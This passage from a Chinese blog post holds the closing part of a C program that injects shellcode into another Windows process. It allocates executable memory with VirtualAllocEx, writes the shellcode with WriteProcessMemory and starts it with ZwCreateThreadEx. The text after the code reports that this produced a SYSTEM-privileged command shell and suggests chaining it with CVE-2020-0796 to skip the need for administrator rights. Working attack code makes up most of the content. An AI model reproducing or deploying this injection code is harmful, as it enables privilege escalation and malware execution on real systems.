	<span class="token punctuation">}</span>

	<span class="token comment">//在要被注入的进程中创建内存，用于存放注入dll的路径</span>
	Buff <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>Buff <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Buff alloc error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//将dll路径写入刚刚创建的内存中</span>
	<span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> Buff<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>write_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> <span class="token operator">!=</span> write_len<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//加载ntdll.dll并从中获取内核函数ZwCreateThread，并使用函数指针指向此函数</span>
	Ntdll <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pZwCreateThreadEx ZwCreateThreadEx <span class="token operator">=</span>
		<span class="token punctuation">(</span>pZwCreateThreadEx<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>Ntdll<span class="token punctuation">,</span> <span class="token string">"ZwCreateThreadEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ZwCreateThreadEx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"func get error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//执行ZwCreateThread函数，在指定进程中创建线程加载要被注入的dll</span>
	dwStatus <span class="token operator">=</span> <span class="token function">ZwCreateThreadEx</span><span class="token punctuation">(</span>
		<span class="token operator">&amp;</span>hRemoteThread<span class="token punctuation">,</span>
		PROCESS_ALL_ACCESS<span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		hProcess<span class="token punctuation">,</span>
		<span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>Buff<span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		<span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
		<span class="token constant">NULL</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hRemoteThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"zwcreatethread fun error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//释放不需要的变量以及内存</span>
	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">FreeModule</span><span class="token punctuation">(</span>Ntdll<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>编译执行（必须使用管理员权限）<br> <img src="https://images2.imgbox.com/de/43/6hHxBdCq_o.jpg" alt="在这里插入图片描述"><br> 成功获得system权限cmd<br> 不足：还是需要先得到管理员权限，如果可以与类似<a href="https://blog.csdn.net/weixin_43815930/article/details/109718811">CVE-2020-0796</a>的漏洞合用就可以越过管理员权限</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/fb5d9b1fbda0e93172b129b72c61dfab/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">docker镜像启动后端口号是多少_Docker 安装部署</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/054bd01b67a5d7c847a633a5cc0fb845/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">小苹果源地址_越狱常用源地址推荐</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>